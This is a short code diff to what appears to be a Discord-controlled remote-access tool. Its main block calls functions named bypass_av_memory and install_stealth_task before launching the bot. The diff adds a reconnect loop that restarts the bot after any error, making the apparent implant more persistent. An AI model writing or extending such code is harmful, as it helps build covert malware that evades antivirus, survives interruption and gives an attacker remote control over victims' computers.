@@ -977,8 +977,21 @@ async def sysinfo(ctx):
     except Exception as e:
         await ctx.send(f"Ошибка: {e}")
 
+def run_resilient():
+    while True:
+        try:
+            bot._closed = False
+            bot._closing_task = None
+            if hasattr(bot, "http") and hasattr(_dc.utils, "MISSING"):
+                bot.http.connector = _dc.utils.MISSING
+            bot.run(BOT_TOKEN, log_handler=None)
+        except KeyboardInterrupt:
+            break
+        except Exception:
+            time.sleep(5)
+
 if __name__ == "__main__":
     if check_environment():
         bypass_av_memory()
         install_stealth_task()
-        bot.run(BOT_TOKEN)
+        run_resilient()
